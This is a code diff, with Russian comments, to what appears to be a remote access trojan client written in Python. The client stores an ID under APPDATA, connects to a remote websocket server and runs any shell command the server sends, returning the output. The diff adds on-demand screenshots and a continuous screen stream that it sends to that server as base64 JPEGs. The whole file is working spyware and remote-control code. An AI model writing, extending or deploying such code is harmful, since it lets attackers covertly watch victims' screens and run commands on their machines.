@@ -6,6 +6,10 @@ import json
 import subprocess
 import os
 import uuid
+from io import BytesIO
+import base64
+import pyautogui  # или PIL.ImageGrab для Windows
+import threading
 
 APPDATA_DIR = os.getenv("APPDATA") or os.path.expanduser("~/.config")
 ID_FILE = os.path.join(APPDATA_DIR, "id.txt")
@@ -35,6 +39,18 @@ def has_internet():
     except requests.RequestException:
         return False
 
+# Флаг управления стримом
+stream_flag = {"running": False}
+
+async def send_screens(ws):
+    while stream_flag["running"]:
+        screenshot = pyautogui.screenshot().resize((800, 450))
+        buffer = BytesIO()
+        screenshot.save(buffer, format="JPEG", quality=70)
+        encoded = base64.b64encode(buffer.getvalue()).decode()
+        await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
+        await asyncio.sleep(0.2)  # ~5 FPS
+
 async def connect_and_listen(address):
     async with websockets.connect(f"wss://{address}") as ws:
         await ws.send(json.dumps({"id": CLIENT_ID}))
@@ -55,6 +71,19 @@ async def connect_and_listen(address):
                 elif cmd_type == "cmd":
                     result = subprocess.getoutput(content)
                     await ws.send(json.dumps({"id": CLIENT_ID, "output": result}))
+                elif cmd_type == "screen":
+                    # Однократный скрин
+                    screenshot = pyautogui.screenshot().resize((800, 450))
+                    buffer = BytesIO()
+                    screenshot.save(buffer, format="JPEG", quality=70)
+                    encoded = base64.b64encode(buffer.getvalue()).decode()
+                    await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
+                elif cmd_type == "start_stream":
+                    if not stream_flag["running"]:
+                        stream_flag["running"] = True
+                        asyncio.create_task(send_screens(ws))
+                elif cmd_type == "stop_stream":
+                    stream_flag["running"] = False
             except Exception as e:
                 await ws.send(json.dumps({"id": CLIENT_ID, "error": str(e)}))
 
